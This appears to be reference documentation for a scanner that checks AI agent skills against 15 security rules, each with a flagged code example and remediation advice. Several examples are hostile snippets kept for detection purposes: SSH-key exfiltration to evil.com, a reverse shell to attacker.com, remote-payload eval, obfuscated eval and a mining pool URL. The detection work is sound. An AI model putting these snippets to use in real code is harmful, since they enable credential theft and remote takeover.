# Security Rules Reference

AgentShield ships with 15 built-in security rules. Each rule is described below with examples and remediation advice.

---

## 🔴 Critical Rules

### `data-exfil` — Data Exfiltration
**Detects:** Code that reads sensitive files (SSH keys, credentials, configs) AND sends HTTP requests in the same file.

**Example (flagged):**
```javascript
const key = fs.readFileSync("~/.ssh/id_rsa");
fetch("https://evil.com/collect", { body: key });
```

**Fix:** Separate data reading from network calls. If both are needed, audit the destination URL and ensure secrets are never sent externally.

---

### `backdoor` — Dynamic Code Execution
**Detects:** `eval()`, `new Function()`, `child_process.exec()` with dynamic strings, `os.system()`, `subprocess` with `shell=True`.

**Example (flagged):**
```javascript
const payload = getRemotePayload();
eval(payload);
```

**Fix:** Replace `eval()` with `JSON.parse()` for data. Use `execFile()` instead of `exec()`. Avoid `shell: true` in `spawn()`.

---

### `reverse-shell` — Reverse Shell
**Detects:** Outbound socket connections piped to a shell process (`/bin/sh`, `/bin/bash`).

**Example (flagged):**
```javascript
const net = require("net");
const { exec } = require("child_process");
const socket = net.connect(4444, "attacker.com");
socket.pipe(exec("/bin/sh").stdin);
```

**Fix:** Remove any socket-to-shell piping. Legitimate network code should never spawn a shell from a socket connection.

---

### `crypto-mining` — Cryptocurrency Mining
**Detects:** Mining pool connections (`stratum://`, `pool.` domains), known miners (xmrig, coinhive), and WebAssembly crypto patterns.

**Example (flagged):**
```javascript
const pool = "stratum+tcp://pool.minexmr.com:4444";
```

**Fix:** Remove all mining-related code. If you need legitimate crypto operations, document them clearly.

---

### `credential-hardcode` — Hardcoded Credentials
**Detects:** AWS access keys (`AKIA...`), GitHub PATs (`ghp_...`), Stripe keys (`sk_live_...`), and private key blocks in code.

**Example (flagged):**
```javascript
const API_KEY = "ghp_1234567890abcdef1234567890abcdef12345678";
```

**Fix:** Use environment variables or a secrets manager. Never commit credentials to source code.

---

### `env-leak` — Environment Variable Exfiltration
**Detects:** Code that accesses `process.env` (especially secrets/tokens) AND makes outbound HTTP requests.

**Example (flagged):**
```javascript
const secret = process.env.API_SECRET;
fetch("https://example.com/log", { body: secret });
```

**Fix:** Audit which env vars are accessed and where they're sent. Secrets should never leave the process boundary.

---

### `obfuscation` — Code Obfuscation
**Detects:** Base64-encoded strings fed to `eval(atob(...))`, hex-encoded strings, `String.fromCharCode()` with many arguments, and JS obfuscator patterns.

**Example (flagged):**
```javascript
eval(atob("Y29uc29sZS5sb2coInB3bmVkIik="));
```

**Fix:** Decode and review any obfuscated code. Legitimate skills should have readable source code.

---

### `typosquatting` — Dependency Typosquatting
**Detects:** npm dependencies with names suspiciously similar to popular packages (e.g., `1odash` → `lodash`, `axois` → `axios`).

**Example (flagged):**
```json
{ "dependencies": { "1odash": "^4.0.0" } }
```

**Fix:** Verify package names match the official packages. Use `npm info <package>` to confirm.

---

### `hidden-files` — Exposed Secret Files
**Detects:** `.env` files containing passwords, API keys, tokens, or secrets committed to the repo.

**Example (flagged):**
```
# .env
DATABASE_PASSWORD=supersecret123
STRIPE_KEY=sk_live_abc123
```

**Fix:** Add `.env` to `.gitignore`. Use `.env.example` with placeholder values.

---

## 🟡 Warning Rules

### `network-ssrf` — Server-Side Request Forgery
**Detects:** User input flowing into fetch/request URLs, access to AWS metadata endpoint (`169.254.169.254`), and internal IP ranges in URLs.

**Fix:** Validate and allowlist URLs before making requests. Block internal IPs and metadata endpoints.

---

### `privilege` — Permission Mismatch
**Detects:** Discrepancies between SKILL.md declared permissions and actual code behavior (e.g., declares `read` but uses `child_process.exec()`).

**Fix:** Update SKILL.md to accurately reflect all capabilities used, or remove unnecessary API calls.

---

### `supply-chain` — Known CVEs
**Detects:** Known vulnerabilities in npm dependencies via `npm audit`.

**Fix:** Run `npm audit fix` or update vulnerable packages to patched versions.

---

### `sensitive-read` — Sensitive File Access
**Detects:** Code that reads SSH keys, AWS credentials, kubeconfig, Docker config, npm tokens, etc.

**Fix:** Only access credentials that are necessary. Document why access is needed in SKILL.md.

---

### `excessive-perms` — Excessive Permissions
**Detects:** SKILL.md requesting more than 5 permissions, or requesting dangerous permissions (`exec`, `write`, `network`, `browser`) without apparent code use.

**Fix:** Request only the minimum permissions needed. Split complex skills into smaller, focused ones.

---

### `phone-home` — Beacon/Heartbeat
**Detects:** Periodic timers (`setInterval`, cron) combined with outbound HTTP requests — a common telemetry/C2 pattern.

**Fix:** If telemetry is legitimate, document it clearly. Remove any undisclosed periodic network communication.
